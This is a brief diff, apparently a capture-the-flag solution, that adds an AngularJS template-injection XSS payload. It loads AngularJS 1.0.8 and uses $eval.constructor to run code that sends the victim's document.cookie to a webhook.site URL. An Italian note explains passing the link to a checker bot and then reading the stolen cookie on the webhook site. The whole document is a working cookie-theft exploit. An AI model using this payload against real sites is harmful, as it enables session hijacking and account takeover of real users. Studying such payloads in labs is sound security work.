@@ -1,0 +1,7 @@
+<script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>
+<div ng-app ng-csp>
+    {{$eval.constructor("document.location='https://webhook.site/2372086c-8752-4335-bfe1-6600dee61151/?'+ document.cookie")()}}
+</div>    
+
+
+devi copiare il link con thanks sul checker bot. dopo andare su sito webhook e vedere contenuto cookie
